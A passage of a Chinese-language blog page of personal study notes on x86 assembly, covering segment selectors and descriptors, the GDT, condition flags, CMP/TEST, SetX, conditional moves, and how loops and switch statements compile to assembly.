srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3.15.1" style="zoom:67%;"><h3 id="4-2段选择子结构-段寄存器中的值16位-："><a href="#4-2段选择子结构-段寄存器中的值16位-：" class="headerlink" title="4.2段选择子结构(段寄存器中的值16位)："></a><strong>4.2段选择子结构(段寄存器中的值16位)：</strong></h3><p>是用来选择哪个描述表和该表中索引哪个描述符。选择子可以做为指针变量的一部分，从而对应用程序员是可见的，但是一般是由编译器和链接工具来设置的。段选择子的内容一般放在段寄存器中，选择子的格式如下图所示：</p><p><img src="https://chyyuu.gitbooks.io/simple_os_book/content/zh/chapter-1/figures/3.15.2.png" class="lazyload" data-srcset="https://chyyuu.gitbooks.io/simple_os_book/content/zh/chapter-1/figures/3.15.2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3.15.2"></p><p><strong>索引（Index）</strong>：段寄存器中的高13位值作为索引，在描述符表中从8192个描述符中选择一个描述符。<strong>处理器自动将这个索引值乘以8（描述符的长度位8字节）</strong>，再<strong>加上描述符表(GDTR)的基址</strong>来索引描述符表，从而选出一个合适的描述符。</p><p><strong>表指示位（Table Indicator，TI）</strong>：选择应该访问哪一个描述符表。0代表应该访问全局描述符表（GDT）；1代表应该访问局部描述符表（LDT）。</p><p><strong>请求特权级（Requested Privilege Level，RPL）</strong>：用于段级的保护机制，比如，段选择子是CS，则这两位表示当前执行指令的处理器所处的特权级的值，从而你可以了解到当前处理器是处于用户态（Ring 3）还是内核态（Ring 0）。</p><h3 id="4-3段描述符结构-8个字节64位"><a href="#4-3段描述符结构-8个字节64位" class="headerlink" title="4.3段描述符结构(8个字节64位)"></a>4.3段描述符结构(8个字节64位)</h3><p>在分段存储管理机制的保护模式下，每个段由如下三个参数进行定义：段基地址(Base Address)、段界限(Limit)和段属性(Attributes)。</p><p><strong>段基地址：</strong>即线性地址空间中段的起始地址。在80386保护模式下，段基地址长32位。基地址长度与寻址地址的长度相同，所以任何一个段都可以从32位线性地址空间中的任何一个字节开始，而不像实模式下规定边界必须被16整除。</p><p><strong>段界限：</strong>规定段的大小。在80386保护模式下，<strong>段界限用20位表示：2^12^=4096</strong>，而且段界限可以是以单字节为最小单位或以4k字节为最小单位。</p><p><strong>类型（TYPE）</strong>：用于区别不同类型的描述符。可表示所描述的段是代码段还是数据段，所描述的段是否可读/写/执行，段的扩展方向等。</p><p><strong>描述符特权级（Descriptor Privilege Level）（DPL）</strong>：用来实现保护机制。</p><p><strong>段存在位（Segment-Present bit）</strong>：如果这一位为0，则此描述符为非法的，不能被用来实现地址转换。如果一个非法描述符被加载进一个段寄存器，处理器会立即产生异常。图2显示了当存在位为0时，描述符的格式。操作系统可以任意的使用被标识为可用（AVAILABLE）的位。</p><p> <strong>已访问位（Accessed bit）</strong>：当处理器访问该段（当一个指向该段描述符的选择子被加载进一个段寄存器）时，将自动设置访问位。操作系统可清除该位。 </p><p>上述表示段的属性的参数通过段描述符(Segment Descriptor)来表示，一个段描述符占8字节。段描述符的结构如下图所示：</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/3.15.3.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/3.15.3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3.15.3" style="zoom: 50%;"><h3 id="4-4全局描述符表-GDT"><a href="#4-4全局描述符表-GDT" class="headerlink" title="4.4全局描述符表(GDT)"></a>4.4全局描述符表(GDT)</h3><p>全局描述符表的是一个保存多个描述符的“数组”，其起始地址保存在全局描述符表<strong>寄存器GDTR</strong>。<strong>GDTR长48位，其中高32位为基地址，低16位为段界限。</strong>由于GDT 不能用GDT本身之内的描述符进行描述定义，所以采用GDTR寄存器来表示GDT这一特殊的系统段。注意，全部描述符表中第一个段描述符设定为空段描述符。GDTR中的<strong>段界限</strong>以字节为单位。对于含有N个描述符的描述符表的段描述符实际所占空间通常可设为8<em>N，若起始地址为gdt_base，则结束地址为gdt_base+8</em>N-1。 全局描述符表的第一项是不能被CPU使用，所以当一个段选择子的索引（Index）部分和表指示位（Table Indicator）都为0的时（即段选择子指向全局描述符表的第一项时），可以当做一个空的选择子。当一个段寄存器被加载一个空选择子时，处理器并不会产生一个异常。但是，当用一个空选择子去访问内存时，则会产生异常。</p><p><strong>T1=0描述符n给出目的地址的基址与限长</strong><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215194008979.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215194008979.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215194008979" style="zoom:67%;"></p><p><strong>T1=1描述符x给出目的地址的基地址与限长</strong>(先访问GDT，再定位LDT的地址去拿到LDT中存的基地址)</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215194515845.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215194515845.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215194515845" style="zoom:50%;"><h3 id="4-4分段机制的系统寄存器"><a href="#4-4分段机制的系统寄存器" class="headerlink" title="4.4分段机制的系统寄存器"></a>4.4分段机制的系统寄存器</h3><p>80386有4个寄存器来寻址描述表等系统数据结构，用来实现段式内存管理。内存管理寄存器包括：</p><ul><li><strong>全局描述符表寄存器 (Global Descriptor Table Register，GDTR )48bit：</strong>指向全局段描述符表 GDT：主要存放操作系统和各任务公用的描述符</li><li><strong>局部描述符表寄存器 (Local Descriptor Table Register，LDTR)：</strong>指向局部段描述符表 LDT （目前用不上）</li><li><strong>中断门描述符表寄存器 (Interrupt Descriptor Table Register，IDTR)：</strong>指向一张包含中断处理子程序入口点的表（IDT）</li><li><strong>任务寄存器 (Task Register，TR)：</strong>这个寄存器指向当前任务信息存放处，这些信息是处理器进行任务切换所需要的。（目前用不上） 80386有四个32位的控制寄存器，分别命名位CR0、CR1、CR2和CR3。CR0包含指示处理器工作方式、启用和禁止分页管理机制、控制浮点协处理器操作的控制位。具体描述如下：</li><li><strong>PE（保护模式允许 Protection Enable，比特位 0）：</strong>设置PE 将让处理器工作在保护模式下。复位PE将返回到实模式工作。</li><li><strong>PG（分页允许 Paging， 比特位 31）：</strong> PG 指明处理器是否通过页表来转换线性地址到物理地址。在后续试验中将讲述如何设置PG位。 CR0中的位5~位30是保留位，这些位的值必须为0。CR2及CR3由分页管理机制使用，将在后续试验中讲述。在80386中不能使用CR1，否则会引起无效指令操作异常。</li></ul><h1 id="5-一些特殊的命令"><a href="#5-一些特殊的命令" class="headerlink" title="5.一些特殊的命令"></a>5.一些特殊的命令</h1><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216091921827.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216091921827.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216091921827" style="zoom:67%;"><h3 id="5-1其中movs是符号扩展-movz是零扩展"><a href="#5-1其中movs是符号扩展-movz是零扩展" class="headerlink" title="5.1其中movs是符号扩展 movz是零扩展"></a>5.1其中movs是符号扩展 movz是零扩展</h3><h3 id="5-2加载有效地址lea"><a href="#5-2加载有效地址lea" class="headerlink" title="5.2加载有效地址lea"></a>5.2加载有效地址lea</h3><p>加载有效地址(load effective address)指令leaq实际上是movq指令的变形。它的指令形式是从内存读数据到寄存器，但实际上它根本就没有引用内存。</p><p>下面是两种用法：</p><p>1.它的第一个操作数看上去是一个内存引用，但该指令并不是从指定位置读入数据，而是将有效地址写入到目的操作数。这条指令可以为后面的内存引用产生指针</p><p>2.它还可以简洁描述普通的算术操作。编译器经常发现leaq的一些灵活用法，根本就与有效地址计算无关。目的操作数必须是一个寄存器</p><h1 id="6-条件码"><a href="#6-条件码" class="headerlink" title="6.条件码"></a>6.条件码</h1><table><thead><tr><th>CF</th><th>Carry(进位)Flag</th><th>最近的操作使最高位产生了进位。可用来检查无符号操作的溢出。</th></tr></thead><tbody><tr><td>SF</td><td>Sign Flag</td><td>最近的操作得出的结果为负数。</td></tr><tr><td>ZF</td><td>Zero Flag</td><td>最近的操作得出的结果是0。</td></tr><tr><td>OF</td><td>Overflow Flag</td><td>最近的操作导致一个补码溢出——正溢出或者负溢出。</td></tr></tbody></table><p>条件码由算术指令隐含设置</p><p><code>addl Src,Dest   addq Src,Dest</code></p><p><code>t=a+b (a=Src,b=Dest)</code></p><h6 id="CF-set-if-unsigned-t-lt-unsigned-a-无符号溢出"><a href="#CF-set-if-unsigned-t-lt-unsigned-a-无符号溢出" class="headerlink" title="CF set if (unsigned) t &lt; (unsigned) a 无符号溢出"></a>CF set if (unsigned) t &lt; (unsigned) a 无符号溢出</h6><h6 id="ZF-set-if-t-0-零"><a href="#ZF-set-if-t-0-零" class="headerlink" title="ZF set if t ==0    零"></a>ZF set if t ==0    零</h6><h6 id="SF-set-if-t-lt-0-负数"><a href="#SF-set-if-t-lt-0-负数" class="headerlink" title="SF set if t &lt;0    负数"></a>SF set if t &lt;0    负数</h6><h6 id="OF-set-if-a-lt-0-b-lt-0-amp-amp-t-lt-0-a-lt-0-有符号溢出"><a href="#OF-set-if-a-lt-0-b-lt-0-amp-amp-t-lt-0-a-lt-0-有符号溢出" class="headerlink" title="OF set if (a&lt;0==b&lt;0) &amp;&amp; (t&lt;0!=a&lt;0) 有符号溢出"></a>OF set if (a&lt;0==b&lt;0) &amp;&amp; (t&lt;0!=a&lt;0) 有符号溢出</h6><h3 id="CMP指令"><a href="#CMP指令" class="headerlink" title="CMP指令"></a>CMP指令</h3><p><code>cmpl src2,src1</code> (<code>cmpl b,a</code> 类似与计算<code>a-b</code>(但是不改变目的操作数))</p><h6 id="ZF-1-cmp的结果为0，两数相等"><a href="#ZF-1-cmp的结果为0，两数相等" class="headerlink" title="ZF=1 cmp的结果为0，两数相等"></a>ZF=1 cmp的结果为0，两数相等</h6><h5 id="无符号："><a href="#无符号：" class="headerlink" title="无符号："></a>无符号：</h5><h6 id="CF-1-有进位或借位，由于cmp是减操作，所a-lt-b，此时的计算结果已经发生溢出"><a href="#CF-1-有进位或借位，由于cmp是减操作，所a-lt-b，此时的计算结果已经发生溢出" class="headerlink" title="CF=1 有进位或借位，由于cmp是减操作，所a&lt;b，此时的计算结果已经发生溢出"></a>CF=1 有进位或借位，由于cmp是减操作，所a&lt;b，此时的计算结果已经发生溢出</h6><h6 id="CF-0-则说明无借位，但要注意此时的ZF是否为0，若为0，则说明结果不为0，所以此时a-gt-b"><a href="#CF-0-则说明无借位，但要注意此时的ZF是否为0，若为0，则说明结果不为0，所以此时a-gt-b" class="headerlink" title="CF=0 则说明无借位，但要注意此时的ZF是否为0，若为0，则说明结果不为0，所以此时a&gt;b"></a>CF=0 则说明无借位，但要注意此时的ZF是否为0，若为0，则说明结果不为0，所以此时a&gt;b</h6><h5 id="有符号-SF是计算结果为负数置1-："><a href="#有符号-SF是计算结果为负数置1-：" class="headerlink" title="有符号(SF是计算结果为负数置1)："></a>有符号(SF是计算结果为负数置1)：</h5><h6 id="若SF-0，OF-0-则说明了此时的值为正数，没有溢出-a-gt-b"><a href="#若SF-0，OF-0-则说明了此时的值为正数，没有溢出-a-gt-b" class="headerlink" title="若SF=0，OF=0 则说明了此时的值为正数，没有溢出 a&gt;b"></a>若SF=0，OF=0 则说明了此时的值为正数，没有溢出 a&gt;b</h6><h6 id="若SF-1，OF-0-则说明了此时的值为负数，没有溢出，则为a-lt-b"><a href="#若SF-1，OF-0-则说明了此时的值为负数，没有溢出，则为a-lt-b" class="headerlink" title="若SF=1，OF=0 则说明了此时的值为负数，没有溢出，则为a&lt;b"></a>若SF=1，OF=0 则说明了此时的值为负数，没有溢出，则为a&lt;b</h6><h6 id="若SF-0，OF-1-则说明了此时的值为正数，有溢出，可以看出a-lt-b；此时的-a-lt-0-b-gt-0"><a href="#若SF-0，OF-1-则说明了此时的值为正数，有溢出，可以看出a-lt-b；此时的-a-lt-0-b-gt-0" class="headerlink" title="若SF=0，OF=1 则说明了此时的值为正数，有溢出，可以看出a&lt;b；此时的(a&lt;0 b&gt;0)"></a>若SF=0，OF=1 则说明了此时的值为正数，有溢出，可以看出a&lt;b；此时的(a&lt;0 b&gt;0)</h6><h6 id="若SF-1，OF-1则说明了此时的值为负数，有溢出，可以看出a-gt-b；此时的-a-gt-0-b-lt-0"><a href="#若SF-1，OF-1则说明了此时的值为负数，有溢出，可以看出a-gt-b；此时的-a-gt-0-b-lt-0" class="headerlink" title="若SF=1，OF=1则说明了此时的值为负数，有溢出，可以看出a&gt;b；此时的(a&gt;0,b&lt;0)"></a>若SF=1，OF=1则说明了此时的值为负数，有溢出，可以看出a&gt;b；此时的(a&gt;0,b&lt;0)</h6><h3 id="Test指令"><a href="#Test指令" class="headerlink" title="Test指令"></a>Test指令</h3><p><code>testl src2,src1</code>(计算<code>src1 &amp; src2</code> 并设置相应的条件码，不改变操作目的数)</p><h6 id="ZF-set-if-a-amp-b-0"><a href="#ZF-set-if-a-amp-b-0" class="headerlink" title="ZF set if a&amp;b=0"></a>ZF set if a&amp;b=0</h6><h6 id="SF-set-if-a-amp-b-lt-0-最高位的符号位为1"><a href="#SF-set-if-a-amp-b-lt-0-最高位的符号位为1" class="headerlink" title="SF set if a&amp;b&lt;0 (最高位的符号位为1)"></a>SF set if a&amp;b&lt;0 (最高位的符号位为1)</h6><p>test指令同时使CF、OF为0</p><p>test指令两个操作数一般都是一样的，主要来操作数是负数、零、正数</p><h1 id="7-读取条件码-只存入一个字节"><a href="#7-读取条件码-只存入一个字节" class="headerlink" title="7.读取条件码(只存入一个字节)"></a>7.读取条件码(只存入一个字节)</h1><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216141609560.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216141609560.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216141609560" style="zoom:67%;"><p><strong>无符号数</strong>：大于等于ae(above equal) 小于等于be(below equal)</p><p><strong>有符号数</strong>：大于等于ge(great equal)小于等于le(less equal)</p><p><strong>SetX指令</strong>：读取当前的条件码(或者某些条件码的组合)，并存入目的“字节”寄存器</p><p>余下的三个字节不会被修改</p><p>通常使用move<strong>z</strong>bl指令对目的寄存器进行“0”扩展 b-&gt;double word</p><p><strong>X86-64位机器：</strong></p><p>SetX指令读取当前的条件码(或者某些条件码的组合)，并存入目的“字节”寄存器，并且余下的<strong>七个字节不会被修改</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gt</span><span class="params">(<span class="keyword">long</span> x,<span class="keyword">long</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&gt;y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xorl %eax,%eax #自身异或，将eax清0，由于x64的特性，对第32位的结果会自动进行0扩展，此时的rax整个为0</span><br><span class="line">cmpq %rsi,%rdi #compare x:y </span><br><span class="line">setg %al</span><br></pre></td></tr></table></figure><h1 id="8-跳转指令"><a href="#8-跳转指令" class="headerlink" title="8.跳转指令"></a>8.跳转指令</h1><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216143745438.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216143745438.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216143745438" style="zoom: 50%;"><h1 id="9-条件传送指令"><a href="#9-条件传送指令" class="headerlink" title="9.条件传送指令"></a>9.条件传送指令</h1><p><code>comvC src,dest</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmpl %esi,%edi #x:y</span><br><span class="line">cmovle %edx,%eax</span><br></pre></td></tr></table></figure><p>条件传送指令：如果条件C满足，将数据从src传送到dest；比一般的条件跳转指令的效率高，因为其控制流可预测(即条件C是已知的)</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216145308599.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216145308599.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216145308599" style="zoom:50%;"><h1 id="10-循环的汇编表示"><a href="#10-循环的汇编表示" class="headerlink" title="10.循环的汇编表示"></a>10.循环的汇编表示</h1><p>所有循环模式都转换成do-while，再转换成汇编形式</p><h3 id="1-”Do-Whlie”循环"><a href="#1-”Do-Whlie”循环" class="headerlink" title="1.”Do-Whlie”循环"></a><strong>1.”Do-Whlie”循环</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact_do</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        result *=x;</span><br><span class="line">        x=x<span class="number">-1</span>;</span><br><span class="line">    &#125;<span class="keyword">while</span>(x&gt;<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转化成goto版本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact_goto</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result=<span class="number">1</span>;</span><br><span class="line">loop:</span><br><span class="line">    result*=x;</span><br><span class="line">    x=x<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(X&gt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>汇编代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">movq%rsp, %rbp</span><br><span class="line">movl%edi, -20(%rbp) #x-&gt;-20(%rbp)</span><br><span class="line">movl$1, -4(%rbp) #1-&gt;-4(%rbp)</span><br><span class="line">.L2:</span><br><span class="line">movl-4(%rbp), %eax</span><br><span class="line">imull-20(%rbp), %eax #result*=x</span><br><span class="line">movl%eax, -4(%rbp) #result -&gt; -4(%rbp)</span><br><span class="line">subl$1, -20(%rbp) #x-1</span><br><span class="line">cmpl$1, -20(%rbp) # compare x:1</span><br><span class="line">jle.L3 #小于等于结束</span><br><span class="line">jmp.L2 #大于继续循环</span><br><span class="line">.L3:</span><br><span class="line">movl-4(%rbp), %eax</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h3 id="2-“while”循环"><a href="#2-“while”循环" class="headerlink" title="2.“while”循环"></a>2.“while”循环</h3><p>while循环转成do while就是入口先做一层判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact_while</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        result*=x;</span><br><span class="line">        x=x<span class="number">-1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转化成goto版本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact_while_goto</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result=<span class="number">1</span>;</span><br><span class="line">loop:</span><br><span class="line">    <span class="keyword">if</span>((!x&gt;<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    result*=x;</span><br><span class="line">    x=x<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> loop;</span><br><span class="line">done:</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">movl%edi, -20(%rbp)</span><br><span class="line">movl$1, -4(%rbp)</span><br><span class="line">.L3:</span><br><span class="line">cmpl$1, -20(%rbp)#先判断x是否大于1</span><br><span class="line">jle.L2</span><br><span class="line">movl-4(%rbp), %eax</span><br><span class="line">imull-20(%rbp), %eax</span><br><span class="line">movl%eax, -4(%rbp)</span><br><span class="line">subl$1, -20(%rbp)</span><br><span class="line">jmp.L3</span><br><span class="line">.L2:</span><br><span class="line">movl-4(%rbp), %eax</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h3 id="3-“For”循环"><a href="#3-“For”循环" class="headerlink" title="3.“For”循环"></a>3.“For”循环</h3><p>For-&gt;while-&gt;Do_while</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result;</span><br><span class="line"><span class="keyword">for</span>(result=<span class="number">1</span>;p!=<span class="number">0</span>;p=&gt;&gt;<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p&amp;<span class="number">0x1</span>)</span><br><span class="line">        result*=x;</span><br><span class="line">    x=x*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216153803951.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216153803951.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216153803951" style="zoom: 50%;"><h1 id="11-Switch的汇编表示"><a href="#11-Switch的汇编表示" class="headerlink" title="11.Switch的汇编表示"></a>11.Switch的汇编表示</h1><ul><li>使用一组if-then-else语句来实现</li><li>使用跳转表</li></ul><p><strong>表结构：</strong></p><p>·每个表项(及跳转地址)占4个字节</p><p>·基地址.L62</p><p><code>jmp *.L62(,%edx,4)</code>把<code>.L62</code>做为起始地址，计算结果.<code>L62+%edx*4</code></p><p>上面的*表明这个是一个间接跳转，即目标地址存于内存地址中</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216160707573.png" class="lazyload" 